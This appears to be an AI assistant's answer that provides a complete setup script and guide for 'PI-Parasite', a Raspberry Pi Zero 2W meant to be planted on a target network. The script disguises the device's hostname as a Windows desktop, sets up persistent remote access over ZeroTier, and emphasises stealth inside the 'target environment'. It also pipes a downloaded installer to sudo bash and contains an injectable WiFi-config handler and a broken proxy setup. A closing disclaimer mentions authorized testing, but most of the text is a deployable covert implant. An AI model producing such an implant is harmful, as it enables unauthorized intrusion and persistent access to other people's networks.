Certainly! Below is a comprehensive automated setup for your **PI-Parasite** project. This setup ensures that your Raspberry Pi Zero 2W intelligently manages network connections by prioritizing Ethernet and falling back to Access Point (AP) mode when Ethernet is unavailable. It also provides a web-based dashboard for configuring WiFi credentials dynamically.

---

# PI-Parasite Automated Setup Script

This script automates the entire setup process for **PI-Parasite**, enabling persistent network access via Ethernet or WiFi using ZeroTier. When the Pi boots up, it will:

1. **Check for Ethernet Connection**:
   - If Ethernet is connected, prioritize it for network access.
   - If not, switch to AP mode to allow WiFi configuration via a web dashboard.

2. **AP Mode Configuration**:
   - Set up the Pi as a WiFi Access Point.
   - Launch a web server to accept WiFi credentials.
   - Save the credentials and attempt to connect to the specified WiFi network.

3. **Persistent Configuration**:
   - On subsequent reboots, the Pi will attempt to use Ethernet.
   - If Ethernet is unavailable, it will try to connect to the saved WiFi network.
   - If WiFi is inaccessible, it will revert to AP mode for new credentials.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Automated Setup Script](#automated-setup-script)
3. [Supporting Scripts and Configuration](#supporting-scripts-and-configuration)
4. [Deployment Instructions](#deployment-instructions)
5. [Usage and Workflow](#usage-and-workflow)
6. [Security Considerations](#security-considerations)
7. [Cleanup and Uninstallation](#cleanup-and-uninstallation)
8. [Legal and Ethical Considerations](#legal-and-ethical-considerations)

---

## 1. Prerequisites

- **Hardware**:
  - Raspberry Pi Zero 2W
  - MicroSD card (16GB or larger, Class 10 recommended)
  - USB OTG Ethernet adapter
  - Reliable 5V power supply
  - Optional: USB hub if additional peripherals are needed

- **Software**:
  - Fresh installation of **Debian 12 Lite** for Raspberry Pi
  - SSH access enabled
  - Internet connectivity for initial setup

- **Accounts**:
  - [ZeroTier Account](https://www.zerotier.com/) with a network ID created

---

## 2. Automated Setup Script

Create a setup script named `setup_pi_parasite.sh` that automates the entire configuration process.

### `setup_pi_parasite.sh`

```bash
#!/bin/bash
# PI-Parasite Automated Setup Script
# This script configures the Raspberry Pi Zero 2W for persistent network access using Ethernet and WiFi with ZeroTier.

set -e

# Variables
HOSTNAME_PREFIX="DESKTOP"
ZEROTIER_NETWORK_ID="YOUR_ZEROTIER_NETWORK_ID"  # Replace with your ZeroTier Network ID
WIFI_AP_SSID="PI-Parasite-AP"
WIFI_AP_PASSWORD="ChangeThisPassword"  # Change to a secure password
SCRIPT_DIR="/opt/pi-parasite"

# Function to update and upgrade the system
update_system() {
    echo "Updating and upgrading the system..."
    sudo apt update && sudo apt upgrade -y
}

# Function to install required packages
install_packages() {
    echo "Installing required packages..."
    sudo apt install -y curl ufw hostapd dnsmasq lighttpd python3 python3-flask python3-venv git
}

# Function to configure hostname
configure_hostname() {
    echo "Configuring hostname to mimic Windows device..."
    RANDOM_SUFFIX=$(openssl rand -hex 3 | tr '[:lower:]' '[:upper:]')
    NEW_HOSTNAME="${HOSTNAME_PREFIX}-${RANDOM_SUFFIX}"
    sudo hostnamectl set-hostname "${NEW_HOSTNAME}"
    sudo sed -i "s/127.0.1.1.*/127.0.1.1 ${NEW_HOSTNAME}/" /etc/hosts
    echo "Hostname set to ${NEW_HOSTNAME}"
}

# Function to configure firewall (UFW)
configure_firewall() {
    echo "Configuring UFW firewall..."
    sudo ufw default deny incoming
    sudo ufw default allow outgoing
    sudo ufw allow ssh
    sudo ufw allow 9993/udp  # ZeroTier default port
    sudo ufw --force enable
    echo "Firewall configured to allow only SSH and ZeroTier traffic."
}

# Function to install and configure ZeroTier
install_zerotier() {
    echo "Installing ZeroTier..."
    curl -s https://install.zerotier.com | sudo bash
    sudo systemctl enable zerotier-one
    sudo systemctl start zerotier-one
    sudo zerotier-cli join "${ZEROTIER_NETWORK_ID}"
    echo "ZeroTier installed and joined network ${ZEROTIER_NETWORK_ID}."
    echo "Please authorize the Pi in your ZeroTier Central dashboard."
    echo "Press Enter to continue after authorization..."
    read
}

# Function to generate and configure SSH keys
configure_ssh() {
    echo "Configuring SSH with key-based authentication..."
    sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
    sudo sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
    sudo systemctl restart ssh

    # Create .ssh directory and set permissions
    mkdir -p ~/.ssh
    chmod 700 ~/.ssh

    # Prompt user to paste their public SSH key
    echo "Please paste your public SSH key below and press Enter:"
    read -p "SSH Public Key: " SSH_PUB_KEY
    echo "${SSH_PUB_KEY}" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    echo "SSH key added."
}

# Function to disable unnecessary services
disable_services() {
    echo "Disabling unnecessary services..."
    sudo systemctl disable --now bluetooth.service
    sudo systemctl disable --now avahi-daemon.service
    echo "Unnecessary services disabled."
}

# Function to set up network interfaces
configure_network() {
    echo "Configuring network priorities..."
    sudo bash -c 'cat >> /etc/dhcpcd.conf <<EOL

interface eth0
    metric 100

interface wlan0
    metric 200
EOL'
    sudo systemctl restart dhcpcd
    echo "Network priorities set: Ethernet > WiFi."
}

# Function to set up Access Point (AP) mode
setup_ap_mode() {
    echo "Setting up Access Point (AP) mode..."
    
    # Configure static IP for wlan0
    sudo bash -c 'cat >> /etc/dhcpcd.conf <<EOL

interface wlan0
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
EOL'
    
    # Configure hostapd
    sudo bash -c 'cat > /etc/hostapd/hostapd.conf <<EOL
interface=wlan0
driver=nl80211
ssid='"${WIFI_AP_SSID}"'
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase='"${WIFI_AP_PASSWORD}"'
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOL'
    
    sudo sed -i 's|#DAEMON_CONF=""|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
    
    # Configure dnsmasq
    sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
    sudo bash -c 'cat > /etc/dnsmasq.conf <<EOL
interface=wlan0
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
EOL'
    
    # Enable IP forwarding
    sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
    sudo sysctl -p
    
    # Configure iptables for NAT
    sudo bash -c 'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE'
    sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
    sudo sh -c "iptables-save > /etc/iptables.ipv4.nat"
    
    # Restore iptables on boot
    sudo bash -c 'cat >> /etc/rc.local <<EOL
iptables-restore < /etc/iptables.ipv4.nat
exit 0
EOL'
    
    # Enable and start services
    sudo systemctl unmask hostapd
    sudo systemctl enable hostapd
    sudo systemctl enable dnsmasq
    sudo systemctl start hostapd
    sudo systemctl start dnsmasq
    
    echo "Access Point (AP) mode configured."
}

# Function to set up web dashboard for WiFi configuration
setup_web_dashboard() {
    echo "Setting up web dashboard for WiFi configuration..."
    
    # Create project directory
    sudo mkdir -p "${SCRIPT_DIR}"
    sudo chown -R pi:pi "${SCRIPT_DIR}"
    
    # Create Python virtual environment
    sudo -u pi bash -c "python3 -m venv ${SCRIPT_DIR}/venv"
    sudo -u pi bash -c "source ${SCRIPT_DIR}/venv/bin/activate && pip install flask"
    
    # Create Flask app
    sudo -u pi bash -c "cat > ${SCRIPT_DIR}/app.py <<EOL
from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        ssid = request.form['ssid']
        password = request.form['password']
        update_wifi(ssid, password)
        return redirect(url_for('success'))
    return render_template('index.html')

@app.route('/success')
def success():
    return "WiFi configuration updated successfully! The Pi will reboot and connect to the new network."

def update_wifi(ssid, password):
    wifi_conf = f'''
country=US
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
'''
    with open('/etc/wpa_supplicant/wpa_supplicant.conf', 'w') as f:
        f.write(wifi_conf)
    os.system('sudo wpa_cli -i wlan0 reconfigure')
    os.system('sudo reboot')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOL"
    
    # Create HTML template
    sudo -u pi mkdir -p "${SCRIPT_DIR}/templates"
    sudo -u pi bash -c "cat > ${SCRIPT_DIR}/templates/index.html <<EOL
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Configuration</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f2f2f2; }
        .container { width: 300px; margin: auto; padding-top: 100px; }
        input[type=text], input[type=password] {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            box-sizing: border-box;
        }
        input[type=submit] {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            cursor: pointer;
        }
        input[type=submit]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Configure WiFi</h2>
        <form method="post">
            <label for="ssid">SSID:</label>
            <input type="text" id="ssid" name="ssid" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
EOL"
    
    # Create systemd service for Flask app
    sudo bash -c "cat > /etc/systemd/system/wifi-config.service <<EOL
[Unit]
Description=WiFi Configuration Flask App
After=network.target

[Service]
User=pi
WorkingDirectory=${SCRIPT_DIR}
Environment=\"PATH=${SCRIPT_DIR}/venv/bin\"
ExecStart=${SCRIPT_DIR}/venv/bin/python3 app.py
Restart=always

[Install]
WantedBy=multi-user.target
EOL"
    
    # Enable and start the Flask service
    sudo systemctl daemon-reload
    sudo systemctl enable wifi-config.service
    sudo systemctl start wifi-config.service
    
    # Configure Lighttpd to proxy to Flask app
    sudo bash -c 'cat > /etc/lighttpd/conf-available/15-proxy.conf <<EOL
server.modules += ( "mod_proxy" )

$HTTP["url"] =~ "^/.*$" {
    proxy.server = ( "" => ( ( "host" => "127.0.0.1", "port" => 80 ) ) )
}
EOL'
    
    sudo lighty-enable-mod proxy
    sudo lighty-enable-mod proxy_fcgi
    sudo lighty-enable-mod fastcgi
    sudo lighty-enable-mod setenv
    sudo systemctl restart lighttpd
    
    echo "Web dashboard for WiFi configuration set up."
}

# Function to create startup script for network check
create_startup_script() {
    echo "Creating startup script for network check..."
    
    sudo bash -c 'cat > /usr/local/bin/network-check.sh <<EOL
#!/bin/bash

# Check for Ethernet connection
if ip link show eth0 | grep "state UP" > /dev/null; then
    echo "Ethernet is connected. Ensuring network services are active."
    sudo systemctl enable zerotier-one
    sudo systemctl start zerotier-one
    sudo systemctl disable hostapd
    sudo systemctl disable dnsmasq
    sudo systemctl stop hostapd
    sudo systemctl stop dnsmasq
else
    echo "Ethernet is not connected. Enabling Access Point mode."
    sudo systemctl enable hostapd
    sudo systemctl enable dnsmasq
    sudo systemctl start hostapd
    sudo systemctl start dnsmasq
    sudo systemctl disable zerotier-one
    sudo systemctl stop zerotier-one
fi
EOL'
    
    sudo chmod +x /usr/local/bin/network-check.sh
    
    # Create systemd service to run the script at boot
    sudo bash -c 'cat > /etc/systemd/system/network-check.service <<EOL
[Unit]
Description=Network Check Service
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/network-check.sh

[Install]
WantedBy=multi-user.target
EOL'
    
    sudo systemctl daemon-reload
    sudo systemctl enable network-check.service
    echo "Startup network check script created and enabled."
}

# Function to set up persistent WiFi configuration
setup_persistent_wifi() {
    echo "Setting up persistent WiFi configuration..."
    
    # Ensure wpa_supplicant is properly configured
    sudo bash -c 'cat > /etc/wpa_supplicant/wpa_supplicant.conf <<EOL
country=US
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

# WiFi networks will be added here
EOL'
    
    echo "Persistent WiFi configuration set."
}

# Main Execution
echo "Starting PI-Parasite automated setup..."

update_system
install_packages
configure_hostname
configure_firewall
disable_services
configure_network
setup_ap_mode
setup_web_dashboard
install_zerotier
configure_ssh
create_startup_script
setup_persistent_wifi

echo "PI-Parasite setup complete! Rebooting now..."
sudo reboot
```

---

## 3. Supporting Scripts and Configuration

### a. `network-check.sh`

This script checks for an active Ethernet connection and enables/disables services accordingly.

```bash
#!/bin/bash

# Check for Ethernet connection
if ip link show eth0 | grep "state UP" > /dev/null; then
    echo "Ethernet is connected. Ensuring network services are active."
    sudo systemctl enable zerotier-one
    sudo systemctl start zerotier-one
    sudo systemctl disable hostapd
    sudo systemctl disable dnsmasq
    sudo systemctl stop hostapd
    sudo systemctl stop dnsmasq
else
    echo "Ethernet is not connected. Enabling Access Point mode."
    sudo systemctl enable hostapd
    sudo systemctl enable dnsmasq
    sudo systemctl start hostapd
    sudo systemctl start dnsmasq
    sudo systemctl disable zerotier-one
    sudo systemctl stop zerotier-one
fi
```

### b. Flask Web Application (`app.py`)

The Flask app serves a web interface for WiFi configuration. This script is created and placed in `/opt/pi-parasite/app.py` by the setup script.

```python
from flask import Flask, request, render_template, redirect, url_for
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        ssid = request.form['ssid']
        password = request.form['password']
        update_wifi(ssid, password)
        return redirect(url_for('success'))
    return render_template('index.html')

@app.route('/success')
def success():
    return "WiFi configuration updated successfully! The Pi will reboot and connect to the new network."

def update_wifi(ssid, password):
    wifi_conf = f'''
country=US
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1

network={{
    ssid="{ssid}"
    psk="{password}"
    key_mgmt=WPA-PSK
}}
'''
    with open('/etc/wpa_supplicant/wpa_supplicant.conf', 'w') as f:
        f.write(wifi_conf)
    os.system('sudo wpa_cli -i wlan0 reconfigure')
    os.system('sudo reboot')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

### c. HTML Template (`index.html`)

This HTML file provides the form for entering WiFi credentials. It's created in `/opt/pi-parasite/templates/index.html` by the setup script.

```html
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Configuration</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f2f2f2; }
        .container { width: 300px; margin: auto; padding-top: 100px; }
        input[type=text], input[type=password] {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            box-sizing: border-box;
        }
        input[type=submit] {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            cursor: pointer;
        }
        input[type=submit]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Configure WiFi</h2>
        <form method="post">
            <label for="ssid">SSID:</label>
            <input type="text" id="ssid" name="ssid" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Submit">
        </form>
    </div>
</body>
</html>
```

---

## 4. Deployment Instructions

### a. Prepare the Raspberry Pi

1. **Flash Debian 12 Lite**:
   - Download the [Debian 12 Lite](https://www.debian.org/distrib/) image for Raspberry Pi.
   - Use [Balena Etcher](https://www.balena.io/etcher/) or similar tool to flash the image to your MicroSD card.

2. **Enable SSH**:
   - After flashing, mount the `boot` partition.
   - Create an empty file named `ssh` (no extension) in the `boot` partition to enable SSH on first boot.

3. **Set Initial Hostname (Optional)**:
   - Before booting, you can set a temporary hostname if desired by editing the `hostname` file in the `boot` partition.

4. **Boot the Raspberry Pi**:
   - Insert the MicroSD card into the Pi.
   - Connect the USB OTG Ethernet adapter.
   - Power on the Pi.

5. **SSH into the Pi**:
   - Find the Pi’s IP address via your router or network scanning tool.
   - SSH into the Pi:
     ```bash
     ssh pi@<Pi_IP_Address>
     ```
   - Default password: `raspberry`
   - **Immediately change the password**:
     ```bash
     passwd
     ```

### b. Transfer the Setup Script

1. **Create the Setup Script on Your Local Machine**:
   - Save the `setup_pi_parasite.sh` script provided above to your local machine.

2. **Transfer the Script to the Pi**:
   - Use `scp` or another file transfer method:
     ```bash
     scp setup_pi_parasite.sh pi@<Pi_IP_Address>:/home/pi/
     ```

3. **Make the Script Executable**:
   - SSH into the Pi and run:
     ```bash
     chmod +x /home/pi/setup_pi_parasite.sh
     ```

4. **Run the Setup Script**:
   - Execute the script:
     ```bash
     sudo /home/pi/setup_pi_parasite.sh
     ```
   - The script will perform the following:
     - Update and upgrade the system.
     - Install necessary packages.
     - Configure hostname to mimic a Windows device.
     - Set up firewall rules with UFW.
     - Disable unnecessary services.
     - Configure network interface priorities.
     - Set up AP mode with hostapd and dnsmasq.
     - Deploy a Flask-based web dashboard for WiFi configuration.
     - Install and configure ZeroTier for VPN access.
     - Configure SSH for key-based authentication.
     - Create a startup script to manage network connections on boot.
     - Set up persistent WiFi configuration.

5. **Reboot the Pi**:
   - The script will automatically reboot the Pi upon completion.

---

## 5. Usage and Workflow

### a. Initial Boot Without Ethernet

1. **Power Up the Pi**:
   - If Ethernet is not connected, the Pi will automatically enter AP mode.

2. **Connect to the Pi’s AP**:
   - On your laptop or smartphone, connect to the WiFi network named `PI-Parasite-AP` (or your configured SSID).

3. **Access the Web Dashboard**:
   - Open a web browser and navigate to `http://192.168.4.1`.
   - You should see the WiFi configuration page.

4. **Enter WiFi Credentials**:
   - Input the SSID and password of the target WiFi network.
   - Submit the form.

5. **Pi Reboots and Connects to WiFi**:
   - After submitting, the Pi will reboot and attempt to connect to the specified WiFi network.
   - Ensure that the Pi is accessible via ZeroTier.

### b. Subsequent Boots with Ethernet

1. **Connect Ethernet**:
   - Plug in the Ethernet adapter before or after booting the Pi.

2. **Pi Prioritizes Ethernet**:
   - On boot, the Pi detects the Ethernet connection and uses it for network access.
   - ZeroTier remains active for remote access.

3. **No Need for AP Mode**:
   - If Ethernet is available, the Pi does not enter AP mode, maintaining stealth.

### c. Handling Network Changes

- **Ethernet Disconnected**:
  - If Ethernet is disconnected, the Pi automatically switches to AP mode.
  - Allows you to reconfigure WiFi credentials via the web dashboard.

- **WiFi Unavailable**:
  - If the saved WiFi network is not in range or inaccessible, the Pi reverts to AP mode for new credentials.

---

## 6. Security Considerations

### a. SSH Key Management

- **Use Strong SSH Keys**:
  - Generate SSH keys with at least 4096 bits.
  - Protect your private keys with strong passphrases.

- **Limit Authorized Keys**:
  - Only add necessary public keys to `~/.ssh/authorized_keys`.
  - Regularly audit and remove unused keys.

### b. Firewall Rules

- **Restrict Incoming Traffic**:
  - Only allow SSH and ZeroTier ports.
  - Deny all other incoming connections.

- **Monitor UFW Logs**:
  - Regularly check firewall logs to detect any suspicious activity.

### c. Regular Updates

- **Automate Security Updates**:
  - Consider enabling unattended upgrades for security patches:
    ```bash
    sudo apt install unattended-upgrades -y
    sudo dpkg-reconfigure --priority=low unattended-upgrades
    ```

- **Manual Updates**:
  - Periodically run `sudo apt update && sudo apt upgrade -y` to keep the system updated.

### d. Service Hardening

- **Disable Unused Services**:
  - As done in the setup script, disable services like Bluetooth and Avahi to minimize attack surfaces.

- **Secure Hostapd and Dnsmasq**:
  - Ensure configurations do not expose unnecessary information or ports.

---

## 7. Cleanup and Uninstallation

If you need to remove PI-Parasite from your Raspberry Pi, follow these steps carefully to ensure a clean uninstallation.

### a. Stop and Disable Services

```bash
sudo systemctl stop wifi-config.service
sudo systemctl disable wifi-config.service
sudo systemctl stop hostapd
sudo systemctl disable hostapd
sudo systemctl stop dnsmasq
sudo systemctl disable dnsmasq
sudo systemctl stop zerotier-one
sudo systemctl disable zerotier-one
sudo systemctl stop network-check.service
sudo systemctl disable network-check.service
```

### b. Remove Installed Packages

```bash
sudo apt remove --purge -y curl ufw hostapd dnsmasq lighttpd python3 python3-flask python3-venv git zerotier-one
sudo apt autoremove -y
```

### c. Delete Configuration Files and Scripts

```bash
sudo rm -rf /opt/pi-parasite
sudo rm -f /usr/local/bin/network-check.sh
sudo rm -f /etc/systemd/system/network-check.service
sudo rm -f /etc/systemd/system/wifi-config.service
sudo rm -f /etc/hostapd/hostapd.conf
sudo mv /etc/dnsmasq.conf.orig /etc/dnsmasq.conf
sudo rm -f /etc/iptables.ipv4.nat
```

### d. Revert Hostname and Network Configurations

1. **Restore Original Hostname**:
   ```bash
   sudo hostnamectl set-hostname pi
   sudo sed -i "s/127.0.1.1 .*/127.0.1.1 pi/" /etc/hosts
   ```

2. **Remove Network Metrics**:
   ```bash
   sudo sed -i '/interface eth0/,/metric 200/d' /etc/dhcpcd.conf
   sudo sed -i '/interface wlan0/,/metric 200/d' /etc/dhcpcd.conf
   sudo systemctl restart dhcpcd
   ```

### e. Leave ZeroTier Network

```bash
sudo zerotier-cli leave YOUR_ZEROTIER_NETWORK_ID
```

### f. Reboot the Pi

```bash
sudo reboot
```

---

## 8. Legal and Ethical Considerations

**Important:** This setup is intended solely for authorized cybersecurity testing, penetration testing, and demonstration purposes within controlled environments. Unauthorized access to computer systems is illegal and unethical.

### Guidelines:

- **Obtain Explicit Permission**:
  - Ensure you have written consent from the network and system owners before deploying PI-Parasite.

- **Comply with Laws and Regulations**:
  - Adhere to all local, national, and international laws regarding cybersecurity and data privacy.

- **Maintain Transparency**:
  - Document all actions taken during testing for accountability and reporting.

- **Minimize Impact**:
  - Design PI-Parasite to avoid disrupting normal network operations and user activities.

- **Respect Data Privacy**:
  - Do not access, modify, or exfiltrate sensitive data beyond the scope of the authorized test.

---

## Conclusion

You now have an automated setup script for **PI-Parasite** that configures your Raspberry Pi Zero 2W for persistent and stealthy network access using Ethernet and WiFi with ZeroTier. This setup ensures that the Pi can dynamically switch between network interfaces, maintain remote access, and remain as unobtrusive as possible within the target environment.

**Next Steps:**

1. **Customize Variables**:
   - Replace `YOUR_ZEROTIER_NETWORK_ID` with your actual ZeroTier network ID in the `setup_pi_parasite.sh` script.
   - Change `WIFI_AP_SSID` and `WIFI_AP_PASSWORD` to your desired AP credentials.

2. **Run the Setup**:
   - Follow the deployment instructions to execute the setup script on your Raspberry Pi.

3. **Authorize ZeroTier**:
   - After the script runs, authorize the Pi in your ZeroTier Central dashboard to ensure remote access.

4. **Test Functionality**:
   - Verify that the Pi connects via Ethernet when available.
   - Disconnect Ethernet to test AP mode and WiFi configuration via the web dashboard.

5. **Secure the System**:
   - Ensure that SSH keys are properly managed and that the system is regularly updated.

Feel free to reach out if you encounter any issues or need further customization!